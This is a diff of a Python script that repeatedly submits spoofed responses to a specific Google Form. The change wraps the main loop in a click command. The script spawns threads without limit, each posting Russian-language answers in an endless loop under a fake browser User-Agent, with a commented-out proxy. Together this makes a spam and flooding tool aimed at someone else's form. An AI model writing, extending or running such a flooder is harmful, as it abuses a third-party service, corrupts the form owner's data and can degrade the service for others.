@@ -6,6 +6,7 @@ from LogPython import LogManager
 import requests
 LogManager = LogManager()
 import threading
+import click
 
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.80 Safari/537.36 Edg/86.0.622.43'
@@ -43,7 +44,7 @@ _third_answer_ = 'Если вы дочитали до этого момента,
 random_num = [1, 5]
 
 jojo = random.choice(random_num)
-   
+ 
 def raid(a, b, c, d, e:int):
     while True:
         r = requests.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSfSA182h4jGDBIOcfyMgxeorPUokkb26QS4KZtMpB5H6O3ZcA/formResponse",
@@ -54,7 +55,7 @@ def raid(a, b, c, d, e:int):
                             "entry.1293916860": c,
                             "entry.635193400": d,
                             "entry.1625556646": d,
-                            "entry.24742125": d,
+                            "entry.24742125": d, 
                             "entry.731997419": d,
                             "entry.877852689": d,
                             "entry.325369499": d,
@@ -91,10 +92,16 @@ def raid(a, b, c, d, e:int):
         LogManager.info(f"{thr} === {r} === {e + 1} === {status}")
         # print("\n\n\n==============================================\n\n\n")
 
-i = 0
-while True:
-    threading.Thread(target = raid, args = (_first_answer_, _second_answer_, _third_answer_, jojo, i)).start()
-    i += 1
+@click.command()
+def start(): 
+
+    i = 0
+    while True:
+        threading.Thread(target = raid, args = (_first_answer_, _second_answer_, _third_answer_, jojo, i)).start()
+        i += 1
+      
+if __name__ == "__main__":  
+    start()
 
 # 'proxies = {
 # "https" : "https://159.8.114.34:8123"
